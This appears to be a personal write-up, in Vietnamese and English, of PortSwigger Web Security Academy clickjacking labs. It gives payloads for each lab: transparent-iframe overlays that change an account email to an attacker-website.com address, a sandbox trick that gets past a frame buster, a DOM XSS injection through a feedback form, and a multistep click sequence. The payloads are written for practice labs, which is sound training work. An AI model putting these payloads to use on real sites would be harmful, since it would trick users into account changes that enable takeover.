# APPRENTICE
## 1, Lab: Basic clickjacking with CSRF token protection

login vào với credential wiener:peter 

![alt text](images/image-1.png)

```
<style>
    iframe {
        position:relative;
        width:$width_value;
        height: $height_value;
        opacity: $opacity;
        z-index: 2;
    }
    div {
        position:absolute;
        top:$top_value;
        left:$side_value;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
``` 

![alt text](images/image-3.png)

![alt text](images/image-6.png)

![alt text](images/image-5.png)

![alt text](images/image-4.png)

**explain 

## 2, Lab: Clickjacking with form input data prefilled from a URL parameter

![alt text](images/image-7.png)

my payload

```
<style>
    iframe {
        position:relative;
        width:500px;
        height:700px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top:500px;
        left:80px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0af200c9046bbeae80503ae20006000a.web-security-academy.net/my-account?email=hacker123@attacker-website.com"></iframe>
```

![alt text](images/image-8.png)

![alt text](images/image-9.png)

![alt text](images/image-10.png)

**explain

## 3, Clickjacking with a frame buster script

![alt text](images/image-11.png)

my payload:

```
<style>
    iframe {
        position:relative;
        width:500px;
        height: 700px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top:485px;
        left:80px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe sandbox="allow-forms"
src="https://0a0b002703ab7437800acb3a00f900d1.web-security-academy.net/my-account?email=hacker321@attacker-website.com"></iframe>
```

![alt text](images/image-12.png)

![alt text](images/image-13.png)

**explain

# PRACTITIONER

# 1, Lab: Exploiting clickjacking vulnerability to trigger DOM-based XSS

vào trong phần exploit và đưa payload vào phần body. 
Đây là payload của tôi :

```
<style>
	iframe {
		position:relative;
		width:500px;
		height: 700px;
		opacity: 0.1;
		z-index: 2;
	}
	div {
		position:absolute;
		top:615px;
		left:80px;
		z-index: 1;
	}
</style>
<div>Click me</div>
<iframe
src="https://0a8a008c03c984b980b3035700b40085.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
```
![alt text](images/image-14.png)

![alt text](images/image-15.png)

# 2, Multistep clickjacking

![alt text](images/image-16.png)

my payload
```
<style>
	iframe {
		position:relative;
		width:500px;
		height: 700px;
		opacity: 0.1;
		z-index: 2;
	}
   .firstClick, .secondClick {
		position:absolute;
		top:510px;
		left:50px;
		z-index: 1;
	}
   .secondClick {
		top:300px;
		left:210px;
	}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://0aae00fc039e453b826124d800250029.web-security-academy.net/my-account"></iframe>
```
![alt text](images/image-18.png)

![alt text](images/image-19.png)

![alt text](images/image-20.png)


